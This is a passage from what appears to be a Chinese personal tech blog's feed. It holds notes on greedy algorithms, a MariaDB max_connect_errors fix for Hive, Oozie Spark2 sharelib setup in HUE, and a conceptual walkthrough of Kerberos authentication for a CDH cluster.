class="line"><span class="keyword">return</span> lowest_cost_node</span><br></pre></td></tr></table></figure><p>书上对这个过程的描述还可以，但是我觉得如果能增加一个循环就更好了。</p><h2 id="第八章-贪婪算法"><a href="#第八章-贪婪算法" class="headerlink" title="第八章 贪婪算法"></a>第八章 贪婪算法</h2><h3 id="8-1-教室调度问题"><a href="#8-1-教室调度问题" class="headerlink" title="8.1 教室调度问题"></a>8.1 教室调度问题</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3iys53c86j20m50b140f.jpg" alt></p><p>解决方法：</p><p>(1) 选出结束最早的课，它就是要在这间教室上的第一堂课。 </p><p>(2) 接下来，必须选择第一堂课结束后才开始的课。同样，你选择结束最早的课，这将是要 在这间教室上的第二堂课。 </p><p>重读这样做就能找出答案。</p><p>即：每步都选择局部最优解，最终得到的就是全局最优解。</p><p>此方法并非万能！但是行之有效，并且<strong>简单</strong>！</p><h3 id="8-2-背包问题"><a href="#8-2-背包问题" class="headerlink" title="8.2 背包问题"></a>8.2 背包问题</h3>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;对算法的了解一直很肤浅（听学数学的朋友说算法在数学中也叫数论？），本书阅读不求快，本就是入门读物，希望能尽量理解，争取早日拿下。&lt;/p&gt;
&lt;p&gt;这边值得一提的是作者推荐了一个网站，可汗学院，&lt;code&gt;khanacademy.org&lt;/code&gt;  mark一下。&lt;/p&gt;
&lt;p&gt;看完40%来总结一下，非常好，文盲也能看懂的算法入门。&lt;/p&gt;
&lt;p&gt;这本书看完应该会扫一眼结城浩的《图解密码学》&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="Grokking Algorithms" scheme="http://yoursite.com/categories/Reading-notes/Grokking-Algorithms/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="Grokking Algorithms" scheme="http://yoursite.com/tags/Grokking-Algorithms/"/>
    
      <category term="Algorithm" scheme="http://yoursite.com/tags/Algorithm/"/>
    
      <category term="欧几里得算法" scheme="http://yoursite.com/tags/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/"/>
    
      <category term="快排" scheme="http://yoursite.com/tags/%E5%BF%AB%E6%8E%92/"/>
    
  </entry>
  
  <entry>
    <title>Hive Metastore Server发送元数据请求过多被拒绝</title>
    <link href="http://yoursite.com/2020/03/09/Hive%20Metastore%20Server%E5%8F%91%E9%80%81%E5%85%83%E6%95%B0%E6%8D%AE%E8%AF%B7%E6%B1%82%E8%BF%87%E5%A4%9A%E8%A2%AB%E6%8B%92%E7%BB%9D/"/>
    <id>http://yoursite.com/2020/03/09/Hive Metastore Server发送元数据请求过多被拒绝/</id>
    <published>2020-03-09T10:03:40.632Z</published>
    <updated>2019-05-28T08:44:36.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>在TPCDS测试中Hive莫名其妙挂掉</p></blockquote><a id="more"></a> <p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h4gok9evj20lx09paaq.jpg" alt></p><p>经查，是MySQL最大连接尝试数设置过低，连接失败10次就无法再连接</p><p>在设置的mysql数据库里面，调整次数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| amon               |</span><br><span class="line">| cm                 |</span><br><span class="line">| hive               |</span><br><span class="line">| hue                |</span><br><span class="line">| mysql              |</span><br><span class="line">| oozie              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| test               |</span><br><span class="line">+--------------------+</span><br><span class="line">9 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show variables like &apos;%max_connect_errors%&apos;;</span><br><span class="line">+--------------------+-------+</span><br><span class="line">| Variable_name      | Value |</span><br><span class="line">+--------------------+-------+</span><br><span class="line">| max_connect_errors | 10    |</span><br><span class="line">+--------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; set global max_connect_errors = 1000;</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show variables like &apos;%max_connect_errors%&apos;;</span><br><span class="line">+--------------------+-------+</span><br><span class="line">| Variable_name      | Value |</span><br><span class="line">+--------------------+-------+</span><br><span class="line">| max_connect_errors | 1000  |</span><br><span class="line">+--------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>搞定</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;在TPCDS测试中Hive莫名其妙挂掉&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="CDH" scheme="http://yoursite.com/categories/Hadoop/CDH/"/>
    
    
      <category term="Hive" scheme="http://yoursite.com/tags/Hive/"/>
    
  </entry>
  
  <entry>
    <title>在HUE中整合Oozie和Spark2并验证</title>
    <link href="http://yoursite.com/2020/03/09/HUE%E4%B8%8AOozie%E5%92%8CSpark2%E6%95%B4%E5%90%88/"/>
    <id>http://yoursite.com/2020/03/09/HUE上Oozie和Spark2整合/</id>
    <published>2020-03-09T10:03:40.538Z</published>
    <updated>2019-05-22T08:02:43.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>HDFS上的数据在添加节点失败后，出现了很多块的损坏，得重新配置一遍</p></blockquote><a id="more"></a> <h3 id="查看sharelib文件夹的位置"><a href="#查看sharelib文件夹的位置" class="headerlink" title="查看sharelib文件夹的位置"></a>查看<code>sharelib</code>文件夹的位置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@master126 ~]# oozie admin -oozie http://master126:11000/oozie -sharelibupdate</span><br><span class="line">[ShareLib update status]</span><br><span class="line">sharelibDirOld = hdfs://master126:8020/user/oozie/share/lib/lib_20190521144826</span><br><span class="line">host = http://master126:11000/oozie</span><br><span class="line">sharelibDirNew = hdfs://master126:8020/user/oozie/share/lib/lib_20190521144826</span><br><span class="line">status = Successful</span><br></pre></td></tr></table></figure><h3 id="创建文件目录"><a href="#创建文件目录" class="headerlink" title="创建文件目录"></a>创建文件目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u oozie hdfs dfs -mkdir /user/oozie/share/lib/lib_20190521144826/spark2</span><br></pre></td></tr></table></figure><h3 id="向文件夹中添加Spark2需要的jar包"><a href="#向文件夹中添加Spark2需要的jar包" class="headerlink" title="向文件夹中添加Spark2需要的jar包"></a>向文件夹中添加Spark2需要的jar包</h3><p><code>/opt/cloudera/parcels/SPARK2/lib/spark2/jars</code>文件夹下的所有内容和</p><p><code>/opt/cloudera/parcels/CDH/lib/oozie/oozie-sharelib-yarn/lib/spark</code>下面的<code>oozie-sharelib-spark*.jar</code></p><p>在公司当前环境下，最终能凑齐的一共有293个jar文件，这边我下载下来打个包存在TIM里面，下次使用方便一些。</p><h3 id="修改目录的所有者和权限"><a href="#修改目录的所有者和权限" class="headerlink" title="修改目录的所有者和权限"></a>修改目录的所有者和权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u hdfs hadoop fs –chown -R oozie:oozie /user/oozie/share/lib/lib_20170921070424/spark2</span><br><span class="line">sudo -u hdfs hadoop fs –chmod -R 775 /user/oozie/share/lib/lib_20170921070424/spark2</span><br></pre></td></tr></table></figure><h3 id="更新并且确认"><a href="#更新并且确认" class="headerlink" title="更新并且确认"></a>更新并且确认</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oozie admin -oozie http://master126:11000/oozie -sharelibupdate</span><br><span class="line">oozie admin -oozie http://master126:11000/oozie -shareliblist</span><br></pre></td></tr></table></figure><h3 id="用样例验证"><a href="#用样例验证" class="headerlink" title="用样例验证"></a>用样例验证</h3><p>测试的时候别的没什么</p><p>properties要注意修改为</p><table><thead><tr><th>–</th><th>–</th></tr></thead><tbody><tr><td>oozie.action.sharelib.for.spark</td><td>spark2</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;HDFS上的数据在添加节点失败后，出现了很多块的损坏，得重新配置一遍&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="CDH" scheme="http://yoursite.com/categories/Hadoop/CDH/"/>
    
    
      <category term="HUE" scheme="http://yoursite.com/tags/HUE/"/>
    
  </entry>
  
  <entry>
    <title>Kerberos For CDH</title>
    <link href="http://yoursite.com/2020/03/09/Kerberos%20For%20CDH/"/>
    <id>http://yoursite.com/2020/03/09/Kerberos For CDH/</id>
    <published>2020-03-09T10:03:40.523Z</published>
    <updated>2019-05-15T01:27:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>从18年底开始，公司的服务器经常受到各种挖矿脚本病毒的公司，Java后端Redis漏洞层出不穷，Hadoop这边MR的提交权限BUG也被利用了，于是决定调研Kerberos，发现Kerberos是一个巨大的坑，在此记录下笔记，作为我的Github Pages第一篇文档，希望后来人少走弯路。此文可能分为几次更新。</p><p>第一次更新：2019-4-29</p><p>第二次更新：2019-5-10</p><a id="more"></a> <h3 id="1-Kerberos-入门"><a href="#1-Kerberos-入门" class="headerlink" title="1.Kerberos 入门"></a>1.Kerberos 入门</h3><p>Kerberos是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。Hadoop集群中涉及的Kerberos一般是指MIT基于Kerberos协议开发的一套软件。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2fvwiwb03g20rs0fvaa2.gif" alt="ALT Kerberos"></p><p>Kerberos在希腊神话中是Hades的一条凶猛的三头保卫神犬。这三个头在Kerberos代表了Client、Server和KDC。</p><p><em>Kerberos的特点</em>：并不要求通信双方所在的网络环境安全，即使通信过程中数据被截取或者篡改，依然不会影响整套机制的正常工作。时间戳是Kerberos用来保证通信安全的重要手段。</p><p><em>Kerberos的基本思路</em>：基于对称加密，利用集中的认证服务器，实现用户和服务器之间的双向认证。(提供一种不能伪造、不能重放、已经鉴别的票据对象)。</p><hr><h3 id="2-Kerberos涉及名词"><a href="#2-Kerberos涉及名词" class="headerlink" title="2.Kerberos涉及名词"></a>2.Kerberos涉及名词</h3><p><strong>Principal</strong>：认证的主体，简单来说也就是 用户名</p><p><strong>Kinit</strong>：Kerberos认证(登录)命令，可以使用密码或者KEYTAB</p><p><strong>realm</strong>：有点类似namespace，一个principle只有在某个realm下才有意义</p><p><strong>Password</strong>：某个用户的密码，对应于Kerberos中的master key。password可以存在一个KEYTAB文件中。所以Kerberos中需要使用密码的场景都可以用一个KEYTAB作为输入</p><p><strong>credential</strong>：credential是“证明某个人确定是他自己/某一种行为的确可以发生”的凭据。在不同的使用场景下， credential的具体含义也略有不同：</p><ul><li><p>对于某个principal个体而言，他的credential就是他的password</p></li><li><p>在Kerberos认证的环节中，credential就意味着各种各样的ticket</p></li></ul><p><strong>TGT</strong>：Ticket Granting Ticket，要获得key还需要一个资格认证，获得这个资格认证的证明，叫做TGT</p><p><strong>Long-term Key/Master Key</strong>：在Security的领域中，有的Key可能长期内保持不变，比如你在密码，可能几年都不曾改变，这样的Key、以及由此派生的Key被称为Long-term Key。对于Long-term Key的使用有这样的原则：被Long-term Key加密的数据不应该在网络上传输。原因很简单，一旦这些被Long-term Key加密的数据包被恶意的网络监听者截获，在原则上，只要有充足的时间，他是可以通过计算获得你用于加密的Long-term Key的——任何加密算法都不可能做到绝对保密。</p><p><strong>Short-term Key/Session Key</strong>：由于被Long-term Key加密的数据包不能用于网络传送，所以我们使用另一种Short-term<br>Key来加密需要进行网络传输的数据。由于这种Key只在一段时间内有效，即使被加密的数据包被黑客截获，等他把Key计算出来的时候，这个Key早就已经过期了。</p><hr><h3 id="3-Kerberos原理"><a href="#3-Kerberos原理" class="headerlink" title="3.Kerberos原理"></a>3.Kerberos原理</h3><p>最简单的对称加密的思路：A发送信息给B，信息分为两段，一段是明文，一段是加密之后的密文，这个密钥只有A和B两个人知道，B收到信息后，用两个人都知道的密钥破解了这段密文，如果破解之后的内容和明文内容一致就说明 A的身份没有问题。</p><p><strong>Kerberos就是基于此基础之上的一套复杂的认证机制。</strong></p><p>下面对整个认证过程进行一个细致的分析，对于安装部署过程中纠错来说（尤其CDH集群集成的<code>Kerberos</code>有一些问题），这个过程是非常有必要的：</p><p>通过第二节介绍的两种Key，让被认证的一方提供一个仅限于他和认证方知晓的Key来鉴定对方的真实身份。而被这个<code>Key</code>加密的数据包需要在<code>Client</code>和<code>Server</code>之间传送，所以这个<code>Key</code>不能是一个<code>Long-term Key</code>，而只可能是<code>hort-term Key</code>，这个可以仅仅在<code>Client</code>和<code>Server</code>的一个<code>Session</code>中有效，所以我们称这个<code>Key</code>为<code>Client</code>和<code>Server</code>之间的<code>Session Key（Sserver-Client）</code>。</p><p>这个<code>Sserver-Client</code> 需要引入<code>Kerberos</code>中的一个十分重要的觉得：<code>Kerberos Distribution Center-KDC</code>。<code>KDC</code>在整个<code>Kerberos</code>认证流程中作为<code>Client</code>和<code>Server</code>共同信任的第三方起着重要的作用，而<code>Kerberos</code>的认证过程就是通过这三方协作完成。<code>KDC</code>中维护着一个存储着该<code>Domain</code>中所有账户的<code>Account Database</code>（一个轻量级的数据库），这个数据库汇中存储着每个<code>Account</code>的名称和派生于该<code>Account Password</code>的<code>Master Key</code>，派生手段一般来说是类似Hash这种，不可逆的，然后可以一一对应的方法。</p><p>稍微扩展一下上面的<code>key</code>的分发过程：</p><p>首先是<code>Client</code>向<code>KDC</code>发送一个对<code>SServer-Client</code>的申请。这个申请的内容可以简单概括为“我是某个<code>Client</code>，我需要一个<code>Session Key</code>用于访问某个<code>Server</code> ”。<code>KDC</code>在接受了这个请求以后，生成一个<code>Session</code>Key，为了保证这个<code>Session Key</code>仅仅限于发送请求的<code>Client</code>和他希望访问的<code>Server</code>知晓，<code>KDC</code>会为这个<code>Session Key</code>生成两个<code>Copy</code>，分别被<code>Client</code>和<code>Server</code>使用。然后从<code>Account database</code>中提取<code>Client</code>和<code>Server</code>的<code>Master Key</code>分别对这两个<code>Copy</code>进行对称加密。对于后者，和<code>Session Key</code>一起被加密的还包含关于<code>Client</code>的一些信息。（这里的<code>Client</code>可以理解为发送连接请求的节点，<code>Server</code>可以理解为<code>Client</code>发送请求的接受节点）。</p><p>现在KDC有了两个分别被<code>Master</code>和<code>Server</code>的<code>Master key</code>加密过的<code>Session Key</code>，下面介绍这两个<code>Session Key</code>的处理方式。</p><p>Kerberos 并不会直接把两个加密包分别发送给<code>Client</code>和<code>Server</code>，原因主要有两个：</p><p>第一：由于一个<code>Server</code>会面对若干不同的<code>Client</code>, 而每个<code>Client</code>都具有一个不同的<code>Session Key</code>。那么<code>Server</code>就会为所有的<code>Client</code>维护这样一个<code>Session Key</code>的列表，这样对于<code>Server</code>来说是比较麻烦而低效的。</p><p>第二：由于网络传输的不确定性，可能出现这样一种情况：<code>Client</code>很快获得<code>Session Key</code>，并将这个<code>Session Key</code>作为<code>Credential</code>随同访问请求发送到<code>Server</code>，但是用于<code>Server</code>的<code>Session Key</code>确还没有收到，并且很有可能承载这个<code>Session Key</code>的永远也到不了<code>Server</code>端，<code>Client</code>将永远得不到认证。</p><p>为了解决这个问题，<code>Kerberos</code>的做法是：<strong>将这两个被加密的<code>Copy</code>一并发送给<code>Client</code>，属于<code>Server</code>的那份由<code>Client</code>发送给<code>Server</code>。</strong></p><p><code>Client</code>实际上获得了两组信息：一个通过自己<code>Master Key</code>加密的<code>Session Key</code>，另一个被<code>Server</code>的<code>Master Key</code>加密的数据包，包含<code>Session Key</code>和关于自己的一些确认信息。通过一个双方知晓的<code>Key</code>就可以对对方进行有效的认证，但是在一个网络的环境中，这种简单的做法是具有安全漏洞，为此,<code>Client</code>需要提供更多的证明信息，我们把这种证明信息称为<code>Authenticator</code>，在<code>Kerberos</code>的<code>Authenticator</code>实际上就是关于<code>Client</code>的一些信息和当前时间的一个<code>Timestamp</code>。</p><p><code>Client</code>通过自己的<code>Master Key</code>对<code>KDC</code>加密的<code>Session Key</code>进行解密从而获得<code>Session Key</code>，随后创建<strong><code>Authenticator（Client Info + Timestamp）</code></strong>并用<code>Session Key</code>对其加密。最后连同从<code>KDC</code>获得的、被<code>Server</code>的<code>Master Key</code>加密过的数据包<strong><code>（Client Info + Session Key）</code></strong>一并发送到<code>Server</code>端。我们把通过<code>Server</code>的<code>Master Key</code>加密过的数据包称为<code>Session Ticket</code>。当<code>Server</code>接收到这两组数据后，先使用他自己的<code>Master Key</code>对<code>Session Ticket</code>进行解密，从而获得<code>Session Key</code>。随后使用该<code>Session Key</code>解密<code>Authenticator</code>，通过比较<code>Authenticator</code>中的<code>Client Info</code>和<code>Session Ticket</code>中的<code>Client Info</code>从而实现对Client的认证。</p><p>这里涉及到了一个<code>Timestamp</code>，<code>Client</code>向<code>Server</code>发送的数据包如果被某个恶意网络监听者截获，该监听者随后将数据包作为自己的<code>Credential</code>冒充该<code>Client</code>对<code>Server</code>进行访问，在这种情况下，依然可以很顺利地获得<code>Server</code>的成功认证。为了解决这个问题，<code>Client</code>在<code>Authenticator</code>中会加入一个当前时间的<code>Timestamp</code>。</p><p>在<code>Server</code>对<code>Authenticator</code>中的<code>Client Info</code>和<code>Session Ticket</code>中的<code>Client Info</code>进行比较之前，会先提取<code>Authenticator</code>中的<code>Timestamp</code>，并同当前的时间进行比较，如果他们之间的偏差超出一个可以<strong>接受的时间范围（一般是5mins）</strong>，<code>Server</code>会直接拒绝该<code>Client</code>的请求。在这里需要知道的是，<code>Server</code>维护着一个列表，这个列表记录着在这个可接受的时间范围内所有进行认证的Client和认证的时间。对于时间偏差在这个可接受的范围中的<code>Client</code>，<code>Server</code>会从这个列表中获得<strong>最近一个该<code>Client</code>的认证时间</strong>，只有当<code>Server</code>接收到<code>Authenticator</code>时，验证<code>Authenticator</code>中的<code>Timestamp</code>，确定传输时间小于接受范围后，<code>Server</code>才采用进行后续的认证流程。</p><hr><p><strong><code>Time Synchronization</code>的重要性</strong></p><p>上述基于<code>Timestamp</code>的认证机制只有在<code>Client</code>和<code>Server</code>端的时间保持同步的情况才有意义。所以保持<code>Time</code> <code>Synchronization</code>在整个认证过程中显得尤为重要。在一个<code>Domain</code>中，一般通过访问同一个<code>Time Service</code>获得当前时间的方式来实现时间的同步。</p><p><strong>双向认证（Mutual Authentication）</strong></p><p><code>Kerberos</code>一个重要的优势在于它能够提供双向认证：不但<code>Server</code>可以对<code>Client</code> 进行认证，<code>Client</code>也能对<code>Server</code>进行认证。</p><p>具体过程是这样的，如果<code>Client</code>需要对他访问的<code>Server</code>进行认证，会在它向<code>Server</code>发送的<code>Credential</code>中设置一个是否需要认证的<code>Flag</code>。<code>Server</code>在对<code>Client</code>认证成功之后，会把<code>Authenticator</code>中的<code>Timestamp</code>提出来，通过<code>Session Key</code>进行加密，当<code>Client</code>接收到并使用<code>Session Key</code>进行解密之后，如果确认<code>Timestamp</code>和原来的完全一致，那么他可以认定<code>Server</code>正试图访问的<code>Server</code>。</p><p>那么为什么<code>Server</code>不直接把通过Session Key进行加密的<code>Authenticator</code>原样发送给<code>Client</code>，而要把<code>Timestamp</code>提取出来加密发送给<code>Client</code>呢？原因在于防止恶意的监听者通过获取的<code>Client</code>发送的<code>Authenticator</code>冒充<code>Server</code>获得<code>Client</code>的认证。</p><p><strong>More</strong>：</p><p>通过上面的介绍，我们发现<code>Kerberos</code>实际上一个基于<code>Ticket</code>的认证方式。<code>Client</code>想要获取<code>Server</code>端的资源，先得通过<code>Server</code>的认证；而认证的先决条件是<code>Client</code>向<code>Server</code>提供从<code>KDC</code>获得的一个有<code>Server</code>的<code>Master Key</code>进行加密的<code>Session Ticket</code>（<code>Session Key + Client Info</code>）。可以这么说，<code>Session Ticket</code>是<code>Client</code>进入<code>Server</code>领域的一张门票。而这张门票必须从一个合法的<code>Ticket</code>颁发机构获得，这个颁发机构就是<code>Client</code>和<code>Server</code>双方信任的<code>KDC</code>， 同时这张<code>Ticket</code>具有超强的防伪标识：<strong>它是被<code>Server</code>的<code>Master Key</code>加密的。对<code>Client</code>来说， 获得<code>Session</code> <code>Ticket</code>是整个认证过程中最为关键的部分。</strong></p><hr><p>我了解到这儿感觉已经差不多了，然而这还只是Kerbeos的梗概  T_T</p><p><code>Client</code>要获得<code>Ticket</code>之前，还需要一个步骤，即获得<code>KDC</code>的权限确认，这个过程叫做<code>TGT：Ticket</code><br><code>Granting Ticket</code>。<code>TGT</code>的分发方仍然是<code>KDC</code>。首先<code>Client</code>向<code>KDC</code>发起对<code>TGT</code>的申请，申请的内容大致可以这样表示：“我需要一张<code>TGT</code>用以申请获取用以访问所有<code>Server</code>的<code>Ticket</code>”。<code>KDC</code>在收到该申请请求后，生成一个用于该<code>Client</code>和<code>KDC</code>进行安全通信的<code>Session Key（SKDC-Client）</code>。为了保证该<code>Session Key</code>仅供该<code>Client</code>和自己使用，<code>KDC</code>使用<code>Client</code>的<code>Master Key</code>和自己的<code>Master Key</code>对生成的<code>Session Key</code>进行加密，从而获得两个加密的<code>SKDC-Client</code>的<code>Copy</code>。对于后者，随<code>SKDC-Client</code>一起被加密的还包含以后用于鉴定<code>Client</code>身份的关于<code>Client</code>的一些信息。最后<code>KDC</code>将这两份<code>Copy</code>一起发送给<code>Client</code>。这里有一点需要注意的是：为了免去<code>KDC</code>对于基于不同<code>Client</code>的<code>Session Key</code>进行维护的麻烦，就像<code>Server</code>不会保存<code>Session Key（SServer-Client）</code>一样，<code>KDC</code>也不会去保存这个<code>Session Key（SKDC-Client）</code>，而选择完全靠<code>Client</code>自己提供的方式。</p><p>当<code>Client</code>收到<code>KDC</code>的两个加密数据包之后，先使用自己的<code>Master Key</code>对第一个<code>Copy</code>进行解密，从而获得<code>KDC</code>和<code>Client</code>的<code>Session</code><br><code>Key（SKDC-Client）</code>，并把该<code>Session</code> 和<code>TGT</code>进行缓存。有了<code>Session Key</code>和<code>TGT</code>，<code>Client</code>自己的<code>Master</code><br><code>Key</code>将不再需要，因为此后<code>Client</code>可以使用<code>SKDC-Client</code>向<code>KDC</code>申请用以访问每个<code>Server</code>的<code>Ticket</code>。同时需要注意的是<code>SKDC-Client</code>是一个<code>Session Key</code>，他具有自己的生命周期，同时<code>TGT</code>和<code>Session</code>相互关联，当<code>Session Key</code>过期，<code>TGT</code>也就宣告失效，此后<code>Client</code>不得不重新向<code>KDC</code>申请新的<code>TGT</code>，<code>KDC</code>将会生成一个不同<code>Session Key</code>和与之关联的<code>TGT</code>。同时，由于<code>Client Log off</code>也导致<code>SKDC-Client</code>的失效，所以<code>SKDC-Client</code>又被称为<code>Logon Session Key</code>。<strong><code>TGT</code>和<code>Ticket</code>有个区别就是<code>Ticket</code>是基于某个具体的<code>Server</code>的，而<code>TGT</code>则是和具体的<code>Server</code>无关的。</strong></p><p><code>Client</code>在获得自己和<code>KDC</code>的<code>Session Key（SKDC-Client）</code>之后，生成自己的<code>Authenticator</code>以及所要访问的<code>Server</code>名称的并使用<code>SKDC-Client</code>进行加密。随后连同<code>TGT</code>一起发送给<code>KDC</code>。<code>KDC</code>使用自己的<code>Master Key</code>对<code>TGT</code>进行解密，提取<code>Client Info</code>和<code>Session Key（SKDC-Client）</code>，然后使用这个<code>SKDC-Client</code>解密<code>Authenticator</code>获得<code>Client Info</code>，对两个<code>Client Info</code>进行比较进而验证对方的真实身份。验证成功，生成一份基于<code>Client</code>所要访问的<code>Server</code>的<code>Ticket</code>给<code>Client</code>，然后继续上面之说的过程。</p><p>介绍了这么多，重新把整个过程理一遍：</p><p>现在介绍的整个Authentication过程大概分为三个子过程</p><ul><li><p>Client向KDC申请TGT（Ticket Granting Ticket）。</p></li><li><p>Client通过获得TGT向DKC申请用于访问Server的Ticket。</p></li><li><p>Client最终向为了Server对自己的认证向其提交Ticket。</p></li></ul><p>整个Kerberos Authentication认证过程通过3个sub-protocol来完成：</p><ol><li>Authentication Service Exchange</li><li>Ticket Granting Service Exchange</li><li>Client/Server Exchange</li></ol><p>下面内容来自官方文档的翻译：</p><p>1.Authentication Service Exchange</p><p><code>Client</code>向<code>KDC</code>的<code>Authentication Service</code>发送<code>Authentication Service Request</code>（<code>KRB_AS_REQ</code>）, 为了确保<code>KRB_AS_REQ</code>仅限于自己和<code>KDC</code>知道，<code>Client</code>使用自己的<code>Master Key</code>对<code>KRB_AS_REQ</code>的主体部分进行加密（<code>KDC</code>可以通过<code>Domain</code> 的<code>Account Database</code>获得该<code>Client</code>的<code>Master Key</code>）。<code>KRB_AS_REQ</code>的大体包含以下的内容：</p><ul><li><code>Pre-authentication data</code>：包含用以证明自己身份的信息。说白了，就是证明自己知道自己声称的那个<code>account</code>的<code>Password</code>。一般地，它的内容是一个被<code>Client</code>的<code>Master key</code>加密过的<code>Timestamp</code>。</li><li><code>Client name</code> &amp; <code>realm</code>: 简单地说就是<code>Domain name\Client</code></li><li><code>Server Name</code>：注意这里的<code>Server Name</code>并不是<code>Client</code>真正要访问的<code>Server</code>的名称，而我们也说了<code>TGT</code>是和<code>Server</code>无关的（<code>Client</code>只能使用<code>Ticket</code>，而不是<code>TGT</code>去访问<code>Server</code>）。这里的<code>Server Name</code>实际上是<code>KDC</code>的<code>Ticket Granting Service</code>的<code>Server Name</code>。</li></ul><p><code>AS（Authentication Service）</code>通过它接收到的<code>KRB_AS_REQ</code>验证发送方的是否是在<code>Client name</code> &amp; <code>realm</code>中声称的那个人，也就是说要验证发送方是否知道<code>Client</code>的<code>Password</code>。所以<code>AS</code>只需从<code>Account Database</code>中提取<code>Client</code>对应的<code>Master Key</code>对<code>Pre-authentication data</code>进行解密，如果是一个合法的<code>Timestamp</code>，则可以证明发送方提供的是正确无误的密码。验证通过之后，<code>AS</code>将一份<code>Authentication Service</code> <code>Response（KRB_AS_REP）</code>发送给<code>Client</code>。<code>KRB_AS_REQ</code>主要包含两个部分：本<code>Client</code>的<code>Master Key</code>加密过的<code>Session Key（SKDC-Client：Logon Session Key）</code>和被自己（<code>KDC</code>）加密的<code>TGT</code>。而<code>TGT</code>大体又包含以下的内容：</p><ul><li><p><code>Client name &amp; realm</code>: 简单地说就是<code>Domain name\Client</code></p></li><li><p><code>Client name &amp; realm</code>: 简单地说就是<code>Domain name\Client</code></p></li><li><p><code>End time</code>: <code>TGT</code>到期的时间</p></li></ul><p>Client通过自己的Master Key对第一部分解密获得Session Key（SKDC-Client：Logon Session Key）之后，携带着TGT便可以进入下一步：TGS（Ticket Granting Service）Exchange。</p><p>2.Ticket Granting Service Exchange</p><p><code>TGS</code>（<code>Ticket Granting Service</code>）<code>Exchange</code>通过<code>Client</code>向<code>KDC</code>中的<code>TGS</code>（<code>Ticket Granting Service</code>）发送<code>Ticket Granting Service Request</code>（<code>KRB_TGS_REQ</code>）开始。<code>KRB_TGS_REQ</code>大体包含以下的内容：</p><ul><li><p>TGT：Client通过AS Exchange获得的Ticket Granting Ticket，TGT被KDC的Master Key进行加密。</p></li><li><p>Authenticator：用以证明当初TGT的拥有者是否就是自己，所以它必须以TGT的办法方和自己的Session Key（SKDC-Client：Logon Session Key）来进行加密。</p></li><li><p>Client name &amp; realm: 简单地说就是Domain name\Client。</p></li><li><p>Server name &amp; realm: 简单地说就是Domain name\Server，这回是Client试图访问的那个Server。</p></li></ul><p><code>TGS</code>收到<code>KRB_TGS_REQ</code>在发给<code>Client</code>真正的<code>Ticket</code>之前，先得整个<code>Client</code>提供的那个<code>TGT</code>是否是<code>AS</code>颁发给它的。于是它不得不通过<code>Client</code>提供的<code>Authenticator</code>来证明。但是<code>Authentication</code>是通过<code>Logon Session Key（SKDC-Client）</code>进行加密的，而自己并没有保存这个<code>Session Key</code>。所以TGS先得通过自己的<code>Master Key</code>对<code>Client</code>提供的<code>TGT</code>进行解密，从而获得这个<code>Logon Session Key（SKDC-Client）</code>，再通过这个<code>Logon Session Key（SKDC-Client）</code>解密<code>Authenticator</code>进行验证。验证通过向对方发送<code>Ticket Granting</code><br><code>Service Response（KRB_TGS_REP）</code>。这个<code>KRB_TGS_REP</code>有两部分组成：使用<code>Logon Session Key（SKDC-Client）</code>加密过用于<code>Client</code>和<code>Server</code>的<code>Session 